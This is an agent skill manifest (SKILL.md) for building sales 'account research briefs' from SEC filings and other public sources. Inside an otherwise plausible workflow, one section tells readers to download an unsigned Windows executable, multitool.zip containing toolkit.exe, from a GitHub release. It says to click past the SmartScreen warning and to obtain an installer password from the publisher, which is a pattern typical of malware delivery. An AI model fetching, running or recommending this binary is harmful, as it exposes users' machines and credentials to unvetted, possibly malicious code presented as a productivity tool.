---
name: account-research-brief
description: Builds a per-deal US account brief from public filings and company pages, with every fact tied to a source and a date checked. Use when the user asks for account research brief, deal research template, company research for a deal. For US reps working a specific live deal who need context before the next buyer call.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Account Research Brief

**Builds a per-deal US account brief from public filings and company pages, with every fact tied to a source and a date checked.** Written for US reps working a specific live deal who need context before the next buyer call.

Use this skill when someone asks for:

- account research brief
- deal research template
- company research for a deal
- sec filings sales research

---

## The job

Reps spend an hour on a live deal and end up with company history instead of the context they need to move that specific opportunity.

## What you get

1. Start from the deal: the opportunity, the champion, the date and the ask.
2. Pull only the public facts that bear on this deal, each with its source URL and the date checked.
3. Write the trigger, the risk, the open question and the next step.
4. Mark the facts that are stale or unconfirmed so the rep verifies them on the call.

Output contract:

- brief - one page: deal, trigger, why now, risk and next step
- facts - each fact with its source URL and the date it was checked
- questions - the three things the rep must confirm before the next call
- stale - the facts that need a re-check before they are used

## US specifics that matter

- SEC EDGAR full-text search covers filings from 2001 onward, and the filing list is the fastest public record of a company's changes.
- A Form 8-K is due within 4 business days of the triggering event, and a Form 10-K is due 60 days after fiscal year end for large accelerated filers, 75 days for accelerated filers and 90 days for non-accelerated filers.
- Federal contractors must be registered in SAM.gov and use a unique entity identifier on proposals and contracts.
- The US Census Bureau's NAICS codes run to six digits and are the common size and industry key for US account data.
- A state Secretary of State registry confirms the legal entity name and its standing, and the USPTO trademark search confirms who holds a mark.

## Guardrails (hard rules)

- Never build a per-deal brief from personal social profiles, leaked databases or bought contact data.
- Never present a fact without its source URL and the date it was checked.
- Never turn the brief into a targeting list; it covers one live deal only.
- Never invent a trigger to make the deal look urgent.

## Quickstart

### 1. Fill in the brief

`templates/deal-brief.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_deal_brief.py --input deal-brief.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/account-research-sources.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Company and filing sources**

- SEC EDGAR: the 10-K for the business, the 8-K for recent events, the S-1 for an IPO filing.
- The company's own newsroom, product pages and careers page.
- The state Secretary of State registry for entity name and standing.
- SAM.gov for a federal contractor's registration and entity identifier.

**Context that moves a deal**

- A funding round, a new product line, a leadership change or a compliance deadline.
- Public job postings for what the team is building right now.
- A contract award or an expansion in the buyer's region.
- A price change or a product deprecation on the company's own site.

**Rules for the brief**

- One page, and every fact carries a source URL and a date checked.
- Mark the facts that are older than the deal and need a re-check.
- Keep the brief on the deal: no account ranking and no list building.
- Separate what the buyer said from what the public record says.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/account-research-sources.md` - Public US sources for a per-deal brief
- `templates/deal-brief.yaml` - the brief to fill in
- `scripts/build_deal_brief.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_deal_brief.py --input deal-brief.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
